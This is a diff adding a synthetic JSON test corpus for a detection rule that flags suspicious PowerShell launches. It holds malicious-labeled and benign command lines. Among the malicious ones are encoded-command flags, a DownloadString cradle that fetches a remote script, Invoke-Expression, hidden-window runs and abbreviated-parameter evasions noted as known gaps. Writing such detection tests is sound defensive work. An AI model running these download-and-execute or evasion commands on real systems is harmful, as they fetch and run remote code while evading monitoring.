@@ -1,0 +1,293 @@
+{
+ "rule": "SX-002",
+ "description": "Synthetic labeled cases. A regression corpus, not a real-world evaluation.",
+ "cases": [
+  {
+   "id": "SX-002-m01",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "encoded command -enc",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -nop -enc SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m02",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "-EncodedCommand long form",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -EncodedCommand SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m03",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "-ec short form",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -ec SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m04",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "DownloadString cradle",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m05",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "IEX alias",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -c iex (gc .\\a.txt)"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m06",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Invoke-Expression",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -c Invoke-Expression $x"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m07",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "-nop with hidden window",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -nop -w hidden -File a.ps1"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m08",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "pwsh -enc",
+   "events": [
+    {
+     "k": "p",
+     "img": "pwsh.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "pwsh.exe -enc SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m09",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "-e flag at end of command line",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -e"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m10",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "known_gap": true,
+   "note": "abbreviated parameter -EncodedC",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -EncodedC SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-m11",
+   "rule": "SX-002",
+   "label": "malicious",
+   "synthetic": true,
+   "known_gap": true,
+   "note": "abbreviated parameter -en",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -en SQBFAFgA"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b01",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Get-Date",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe Get-Date"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b02",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Get-Process",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -Command Get-Process"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b03",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "run a script file",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -File C:\\scripts\\backup.ps1"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b04",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "ExecutionPolicy Bypass with a script file (common admin use)",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -ExecutionPolicy Bypass -File a.ps1"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b05",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "-nop alone",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -nop -File a.ps1"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b06",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "notepad with -enc in args (not PowerShell)",
+   "events": [
+    {
+     "k": "p",
+     "img": "notepad.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "notepad.exe -enc notes.txt"
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b07",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "echo",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -Command \"echo hello\""
+    }
+   ]
+  },
+  {
+   "id": "SX-002-b08",
+   "rule": "SX-002",
+   "label": "benign",
+   "synthetic": true,
+   "note": "word 'diced' contains 'iex'-like text",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe -Command Write-Output diced"
+    }
+   ]
+  }
+ ]
+}
